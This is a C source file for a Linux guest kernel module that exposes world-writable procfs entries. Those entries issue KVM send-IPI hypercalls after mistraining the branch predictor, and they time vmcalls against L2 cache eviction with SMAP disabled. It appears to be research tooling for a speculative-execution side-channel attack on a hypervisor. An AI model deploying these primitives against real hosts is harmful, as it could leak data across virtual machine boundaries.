// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "cache_eviction.h"
#include "hypercall.h"
#include "linux/gfp_types.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_send_ipi;
static struct proc_dir_entry *proc_measure_cache_eviction_set;

static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }

static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
  // Confuse the branch predictor
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx", "cc");
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  confuse_branch_predictor();

  int type = KVM_HC_SEND_IPI;

  // Do the vmcall once with valid values
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.real.mask_low), "+c"(opts.real.mask_low), "+d"(opts.real.min),
                 "+S"(opts.real.icr.raw_icr));

  // Do the vmcall, this time with the mispredicted buffer
  type = KVM_HC_SEND_IPI;
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.mispredicted.mask_low), "+c"(opts.mispredicted.mask_low),
                 "+d"(opts.mispredicted.min), "+S"(opts.mispredicted.icr.raw_icr));

  return type;
}

static inline __attribute__((always_inline)) size_t
measure_vmcall_timing(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
                      unsigned long rsi) {
  volatile unsigned long time = hypercall_number;
  asm volatile(
      // rdtsc overwrites these, but they are also needed by the vmcall
      "mov %%rdx, %%r14\n"
      "mov %%rax, %%r15\n"

      // Start the timer
      "mfence\n"
      "lfence\n"
      "rdtsc\n"
      "lfence\n"

      // Store the start timestamp in r13 and restore
      // the vmcall parameters
      "movl %%eax, %%r13d\n"
      "mov %%r14, %%rdx\n"
      "mov %%r15, %%rax\n"

      "vmcall\n"

      // Stop the timer, and calculate the difference
      "lfence\n"
      "rdtsc\n"
      "subl %%r13d, %%eax\n"
      : "=a"(time)
      : "b"(rbx), "c"(rcx), "d"(rdx), "S"(rsi)
      : "r13", "r14", "r15");
  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

#define L2_NR_OF_SETS (1024)
struct hc_set_indices {
  size_t size;
  size_t buf[L2_NR_OF_SETS];
};

void push_set_index(struct hc_set_indices *x, size_t idx) {
  BUG_ON(x->size > L2_NR_OF_SETS);
  x->buf[x->size] = idx;
  x->size++;
}

static void prune_set_indices(const char __user *buf, struct hc_set_indices **x, const size_t iterations) {
  struct hc_set_indices *new_set = kzalloc(sizeof(struct hc_set_indices), GFP_KERNEL);
  BUG_ON(!new_set);

  struct hc_set_indices *current_set = *x;

  pr_info("hypercall: new pruning round with %ld candidates\n", current_set->size);

  for (size_t set_idx = 0; set_idx < current_set->size; ++set_idx) {
    disable_smap();

    size_t before = -1;
    size_t after = -1;

    for (size_t i = 0; i < iterations; ++i) {
      confuse_branch_predictor();

      // First, capture the base line
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);
      size_t before_time = measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, 0, 0);

      // Then, evict and do it again
      evict_l2(buf, set_idx);
      size_t after_time = measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, -1, 0);

      before = before_time < before ? before_time : before;
      after = after_time < after ? after_time : after;
    }

    enable_smap();

    if (after > before) {
      push_set_index(new_set, set_idx);
      pr_info("hypercall:\tidx %.4ld\tBefore: %ld\tAfter: %ld\n", set_idx, before, after);
    }

    cond_resched();
  }

  *x = new_set;
  kfree(current_set);
}

static ssize_t measure_cache_evict(struct file *file, const char __user *buf, size_t len, loff_t *offset) {
  struct hc_set_indices *set = kzalloc(sizeof(struct hc_set_indices), GFP_KERNEL);
  for (size_t i = 0; i < L2_NR_OF_SETS; ++i) {
    push_set_index(set, i);
  }

  for (size_t i = 1; i < 12; ++i) {
    prune_set_indices(buf, &set, 100 * i);
  }

  for (size_t i = 0; i < set->size; ++i) {
    pr_info("final: %ld\n", set->buf[i]);
  }

  pr_info("hypercall: cache measurement done!\n");
  kfree(set);

  // Check if it is a huge page address (doing a mask on the address)
  // Do the same vmcall twice and measure the timing of the latter to establish a base line
  // Evict first set
  // Start timer
  // vmcall
  // End timer
  // Evict second set
  // ...
  // List the sets that have higher timings
  return 0;
}

static const struct proc_ops cache_evict_fops = {
    .proc_write = measure_cache_evict,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";
  const char *procfs_cache_evict_name = "measure_cache_eviction_set";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (!proc_root) {
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (!proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }

  // Initialize the measure_cache_eviction_set entry
  proc_measure_cache_eviction_set = proc_create(procfs_cache_evict_name, 0666, proc_root, &cache_evict_fops);
  if (!proc_measure_cache_eviction_set) {
    proc_remove(proc_measure_cache_eviction_set);
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s/%s\n", procfs_root_name,
             procfs_cache_evict_name);
    return -ENOMEM;
  }

  pr_info("hypercall: procfs entries created\n");

  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_measure_cache_eviction_set);
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
  pr_info("hypercall: procfs entries removed\n");
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
